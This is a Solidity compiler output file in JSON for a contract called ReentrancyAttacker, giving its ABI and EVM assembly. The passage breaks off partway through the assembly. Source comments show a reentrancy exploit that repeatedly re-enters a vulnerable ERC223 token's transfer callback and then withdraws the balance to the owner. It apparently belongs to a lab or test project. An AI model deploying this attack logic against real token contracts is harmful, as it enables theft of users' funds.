{
	"contracts/ReentrancyAttacker.sol": {
		"ReentrancyAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_tokenAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_value",
							"type": "uint256"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackCount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackValue",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "token",
					"outputs": [
						{
							"internalType": "contract IVulnerableERC223",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						},
						{
							"internalType": "bytes",
							"name": "",
							"type": "bytes"
						}
					],
					"name": "tokenCallback",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/ReentrancyAttacker.sol\":291:1286  contract ReentrancyAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/ReentrancyAttacker.sol\":452:572  constructor(address _tokenAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/ReentrancyAttacker.sol\":523:536  _tokenAddress */\n  dup1\n    /* \"contracts/ReentrancyAttacker.sol\":497:502  token */\n  0x00\n  dup1\n    /* \"contracts/ReentrancyAttacker.sol\":497:537  token = IVulnerableERC223(_tokenAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/ReentrancyAttacker.sol\":555:565  msg.sender */\n  caller\n    /* \"contracts/ReentrancyAttacker.sol\":547:552  owner */\n  0x01\n  0x00\n    /* \"contracts/ReentrancyAttacker.sol\":547:565  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/ReentrancyAttacker.sol\":452:572  constructor(address _tokenAddress) {... */\n  pop\n    /* \"contracts/ReentrancyAttacker.sol\":291:1286  contract ReentrancyAttacker {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/ReentrancyAttacker.sol\":291:1286  contract ReentrancyAttacker {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/ReentrancyAttacker.sol\":291:1286  contract ReentrancyAttacker {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6be32e73\n      gt\n      tag_10\n      jumpi\n      dup1\n      0x6be32e73\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x8c59507c\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xfc0c546a\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_10:\n      dup1\n      0x3ccfd60b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x407c2821\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x64dd891a\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/ReentrancyAttacker.sol\":1141:1284  function withdraw() external {... */\n    tag_3:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"contracts/ReentrancyAttacker.sol\":387:413  uint256 public attackCount */\n    tag_4:\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ReentrancyAttacker.sol\":890:1135  function attack(uint256 _value) external {... */\n    tag_5:\n      tag_17\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      tag_20\n      jump\t// in\n    tag_17:\n      stop\n        /* \"contracts/ReentrancyAttacker.sol\":578:884  function tokenCallback(address, uint256, bytes calldata) external {... */\n    tag_6:\n      tag_21\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      tag_24\n      jump\t// in\n    tag_21:\n      stop\n        /* \"contracts/ReentrancyAttacker.sol\":419:445  uint256 public attackValue */\n    tag_7:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      tag_27\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ReentrancyAttacker.sol\":361:381  address public owner */\n    tag_8:\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      tag_30\n      swap2\n      swap1\n      tag_31\n      jump\t// in\n    tag_30:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ReentrancyAttacker.sol\":325:355  IVulnerableERC223 public token */\n    tag_9:\n      tag_32\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      tag_34\n      swap2\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ReentrancyAttacker.sol\":1141:1284  function withdraw() external {... */\n    tag_12:\n        /* \"contracts/ReentrancyAttacker.sol\":1202:1207  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":1188:1207  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":1188:1198  msg.sender */\n      caller\n        /* \"contracts/ReentrancyAttacker.sol\":1188:1207  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/ReentrancyAttacker.sol\":1180:1221  require(msg.sender == owner, \"Not owner\") */\n      tag_37\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_38\n      swap1\n      tag_39\n      jump\t// in\n    tag_38:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_37:\n        /* \"contracts/ReentrancyAttacker.sol\":1239:1244  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":1231:1254  payable(owner).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":1231:1277  payable(owner).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/ReentrancyAttacker.sol\":1255:1276  address(this).balance */\n      selfbalance\n        /* \"contracts/ReentrancyAttacker.sol\":1231:1277  payable(owner).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_41:\n      pop\n        /* \"contracts/ReentrancyAttacker.sol\":1141:1284  function withdraw() external {... */\n      jump\t// out\n        /* \"contracts/ReentrancyAttacker.sol\":387:413  uint256 public attackCount */\n    tag_14:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"contracts/ReentrancyAttacker.sol\":890:1135  function attack(uint256 _value) external {... */\n    tag_20:\n        /* \"contracts/ReentrancyAttacker.sol\":963:968  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":949:968  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":949:959  msg.sender */\n      caller\n        /* \"contracts/ReentrancyAttacker.sol\":949:968  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/ReentrancyAttacker.sol\":941:982  require(msg.sender == owner, \"Not owner\") */\n      tag_43\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_44\n      swap1\n      tag_39\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_43:\n        /* \"contracts/ReentrancyAttacker.sol\":1006:1012  _value */\n      dup1\n        /* \"contracts/ReentrancyAttacker.sol\":992:1003  attackValue */\n      0x03\n        /* \"contracts/ReentrancyAttacker.sol\":992:1012  attackValue = _value */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/ReentrancyAttacker.sol\":1036:1037  0 */\n      0x00\n        /* \"contracts/ReentrancyAttacker.sol\":1022:1033  attackCount */\n      0x02\n        /* \"contracts/ReentrancyAttacker.sol\":1022:1037  attackCount = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/ReentrancyAttacker.sol\":1047:1052  token */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":1047:1061  token.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf6368f8a\n        /* \"contracts/ReentrancyAttacker.sol\":1070:1074  this */\n      address\n        /* \"contracts/ReentrancyAttacker.sol\":1077:1083  _value */\n      dup4\n        /* \"contracts/ReentrancyAttacker.sol\":1047:1128  token.transfer(address(this), _value, \"\", \"tokenCallback(address,uint256,bytes)\") */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_45\n      swap3\n      swap2\n      swap1\n      tag_46\n      jump\t// in\n    tag_45:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_48:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_49\n      swap2\n      swap1\n      tag_50\n      jump\t// in\n    tag_49:\n      pop\n        /* \"contracts/ReentrancyAttacker.sol\":890:1135  function attack(uint256 _value) external {... */\n      pop\n      jump\t// out\n        /* \"contracts/ReentrancyAttacker.sol\":578:884  function tokenCallback(address, uint256, bytes calldata) external {... */\n    tag_24:\n        /* \"contracts/ReentrancyAttacker.sol\":672:674  10 */\n      0x0a\n        /* \"contracts/ReentrancyAttacker.sol\":658:669  attackCount */\n      sload(0x02)\n        /* \"contracts/ReentrancyAttacker.sol\":658:674  attackCount < 10 */\n      lt\n        /* \"contracts/ReentrancyAttacker.sol\":658:723  attackCount < 10 && token.balanceOf(address(this)) >= attackValue */\n      dup1\n      iszero\n      tag_52\n      jumpi\n      pop\n        /* \"contracts/ReentrancyAttacker.sol\":712:723  attackValue */\n      sload(0x03)\n        /* \"contracts/ReentrancyAttacker.sol\":678:683  token */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":678:693  token.balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"contracts/ReentrancyAttacker.sol\":702:706  this */\n      address\n        /* \"contracts/ReentrancyAttacker.sol\":678:708  token.balanceOf(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_53\n      swap2\n      swap1\n      tag_31\n      jump\t// in\n    tag_53:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_55\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_55:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_56\n      swap2\n      swap1\n      tag_57\n      jump\t// in\n    tag_56:\n        /* \"contracts/ReentrancyAttacker.sol\":678:723  token.balanceOf(address(this)) >= attackValue */\n      lt\n      iszero\n        /* \"contracts/ReentrancyAttacker.sol\":658:723  attackCount < 10 && token.balanceOf(address(this)) >= attackValue */\n    tag_52:\n        /* \"contracts/ReentrancyAttacker.sol\":654:878  if (attackCount < 10 && token.balanceOf(address(this)) >= attackValue) {  // FIXED LINE... */\n      iszero\n      tag_58\n      jumpi\n        /* \"contracts/ReentrancyAttacker.sol\":754:765  attackCount */\n      0x02\n      0x00\n        /* \"contracts/ReentrancyAttacker.sol\":754:767  attackCount++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_59\n      swap1\n      tag_60\n      jump\t// in\n    tag_59:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/ReentrancyAttacker.sol\":781:786  token */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttacker.sol\":781:795  token.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf6368f8a\n        /* \"contracts/ReentrancyAttacker.sol\":804:808  this */\n      address\n        /* \"contracts/ReentrancyAttacker.sol\":811:822  attackValue */\n      sload(0x03)\n        /* \"contracts/ReentrancyAttacker.sol\":781:867  token.transfer(address(this), attackValue, \"\", \"tokenCallback(address,uint256,bytes)\") */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_61\n      swap3\n      swap2\n      swap1\n      tag_46\n      jump\t// in\n    tag_61:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_63\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_63:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_64\n      swap2\n      swap1\n      tag_50\n      jump\t// in\n    tag_64:\n      pop\n        /* \"contracts/ReentrancyAttacker.sol\":654:878  if (attackCount < 10 && token.balanceOf(address(this)) >= attackValue) {  // FIXED LINE... */\n    tag_58:\n        /* \"contracts/ReentrancyAttacker.sol\":578:884  function tokenCallback(address, uint256, bytes calldata) external {... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/ReentrancyAttacker.sol\":419:445  uint256 public attackValue */\n    tag_26:\n      sload(0x03)\n      dup2\n      jump\t// out\n        /* \"contracts/ReentrancyAttacker.sol\":361:381  address public owner */\n    tag_29:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/ReentrancyAttacker.sol\":325:355  IVulnerableERC223 public token */\n    tag_33:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_65:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_66:\n        /* \"#utility.yul\":177:201   */\n      tag_102\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_65\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_16:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_104\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_66\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":523:640   */\n    tag_68:\n        /* \"#utility.yul\":632:633   */\n      0x00\n        /* \"#utility.yul\":629:630   */\n      dup1\n        /* \"#utility.yul\":622:634   */\n      revert\n        /* \"#utility.yul\":646:763   */\n    tag_69:\n        /* \"#utility.yul\":755:756   */\n      0x00\n        /* \"#utility.yul\":752:753   */\n      dup1\n        /* \"#utility.yul\":745:757   */\n      revert\n        /* \"#utility.yul\":769:891   */\n    tag_70:\n        /* \"#utility.yul\":842:866   */\n      tag_109\n        /* \"#utility.yul\":860:865   */\n      dup2\n        /* \"#utility.yul\":842:866   */\n      tag_65\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":835:840   */\n      dup2\n        /* \"#utility.yul\":832:867   */\n      eq\n        /* \"#utility.yul\":822:885   */\n      tag_110\n      jumpi\n        /* \"#utility.yul\":881:882   */\n      0x00\n        /* \"#utility.yul\":878:879   */\n      dup1\n        /* \"#utility.yul\":871:883   */\n      revert\n        /* \"#utility.yul\":822:885   */\n    tag_110:\n        /* \"#utility.yul\":769:891   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":897:1036   */\n    tag_71:\n        /* \"#utility.yul\":943:948   */\n      0x00\n        /* \"#utility.yul\":981:987   */\n      dup2\n        /* \"#utility.yul\":968:988   */\n      calldataload\n        /* \"#utility.yul\":959:988   */\n      swap1\n      pop\n        /* \"#utility.yul\":997:1030   */\n      tag_112\n        /* \"#utility.yul\":1024:1029   */\n      dup2\n        /* \"#utility.yul\":997:1030   */\n      tag_70\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":897:1036   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1042:1371   */\n    tag_19:\n        /* \"#utility.yul\":1101:1107   */\n      0x00\n        /* \"#utility.yul\":1150:1152   */\n      0x20\n        /* \"#utility.yul\":1138:1147   */\n      dup3\n        /* \"#utility.yul\":1129:1136   */\n      dup5\n        /* \"#utility.yul\":1125:1148   */\n      sub\n        /* \"#utility.yul\":1121:1153   */\n      slt\n        /* \"#utility.yul\":1118:1237   */\n      iszero\n      tag_114\n      jumpi\n        /* \"#utility.yul\":1156:1235   */\n      tag_115\n      tag_68\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":1118:1237   */\n    tag_114:\n        /* \"#utility.yul\":1276:1277   */\n      0x00\n        /* \"#utility.yul\":1301:1354   */\n      tag_116\n        /* \"#utility.yul\":1346:1353   */\n      dup5\n        /* \"#utility.yul\":1337:1343   */\n      dup3\n        /* \"#utility.yul\":1326:1335   */\n      dup6\n        /* \"#utility.yul\":1322:1344   */\n      add\n        /* \"#utility.yul\":1301:1354   */\n      tag_71\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":1291:1354   */\n      swap2\n      pop\n        /* \"#utility.yul\":1247:1364   */\n      pop\n        /* \"#utility.yul\":1042:1371   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1377:1503   */\n    tag_72:\n        /* \"#utility.yul\":1414:1421   */\n      0x00\n        /* \"#utility.yul\":1454:1496   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1447:1452   */\n      dup3\n        /* \"#utility.yul\":1443:1497   */\n      and\n        /* \"#utility.yul\":1432:1497   */\n      swap1\n      pop\n        /* \"#utility.yul\":1377:1503   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1509:1605   */\n    tag_73:\n        /* \"#utility.yul\":1546:1553   */\n      0x00\n        /* \"#utility.yul\":1575:1599   */\n      tag_119\n        /* \"#utility.yul\":1593:1598   */\n      dup3\n        /* \"#utility.yul\":1575:1599   */\n      tag_72\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":1564:1599   */\n      swap1\n      pop\n        /* \"#utility.yul\":1509:1605   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1611:1733   */\n    tag_74:\n        /* \"#utility.yul\":1684:1708   */\n      tag_121\n        /* \"#utility.yul\":1702:1707   */\n      dup2\n        /* \"#utility.yul\":1684:1708   */\n      tag_73\n      jump\t// in\n    tag_121:\n        /* \"#utility.yul\":1677:1682   */\n      dup2\n        /* \"#utility.yul\":1674:1709   */\n      eq\n        /* \"#utility.yul\":1664:1727   */\n      tag_122\n      jumpi\n        /* \"#utility.yul\":1723:1724   */\n      0x00\n        /* \"#utility.yul\":1720:1721   */\n      dup1\n        /* \"#utility.yul\":1713:1725   */\n      revert\n        /* \"#utility.yul\":1664:1727   */\n    tag_122:\n        /* \"#utility.yul\":1611:1733   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1739:1878   */\n    tag_75:\n        /* \"#utility.yul\":1785:1790   */\n      0x00\n        /* \"#utility.yul\":1823:1829   */\n      dup2\n        /* \"#utility.yul\":1810:1830   */\n      calldataload\n        /* \"#utility.yul\":1801:1830   */\n      swap1\n      pop\n        /* \"#utility.yul\":1839:1872   */\n      tag_124\n        /* \"#utility.yul\":1866:1871   */\n      dup2\n        /* \"#utility.yul\":1839:1872   */\n      tag_74\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":1739:1878   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1884:2001   */\n    tag_76:\n        /* \"#utility.yul\":1993:1994   */\n      0x00\n        /* \"#utility.yul\":1990:1991   */\n      dup1\n        /* \"#utility.yul\":1983:1995   */\n      revert\n        /* \"#utility.yul\":2007:2124   */\n    tag_77:\n        /* \"#utility.yul\":2116:2117   */\n      0x00\n        /* \"#utility.yul\":2113:2114   */\n      dup1\n        /* \"#utility.yul\":2106:2118   */\n      revert\n        /* \"#utility.yul\":2130:2247   */\n    tag_78:\n        /* \"#utility.yul\":2239:2240   */\n      0x00\n        /* \"#utility.yul\":2236:2237   */\n      dup1\n        /* \"#utility.yul\":2229:2241   */\n      revert\n        /* \"#utility.yul\":2266:2818   */\n    tag_79:\n        /* \"#utility.yul\":2323:2331   */\n      0x00\n        /* \"#utility.yul\":2333:2339   */\n      dup1\n        /* \"#utility.yul\":2383:2386   */\n      dup4\n        /* \"#utility.yul\":2376:2380   */\n      0x1f\n        /* \"#utility.yul\":2368:2374   */\n      dup5\n        /* \"#utility.yul\":2364:2381   */\n      add\n        /* \"#utility.yul\":2360:2387   */\n      slt\n        /* \"#utility.yul\":2350:2472   */\n      tag_129\n      jumpi\n        /* \"#utility.yul\":2391:2470   */\n      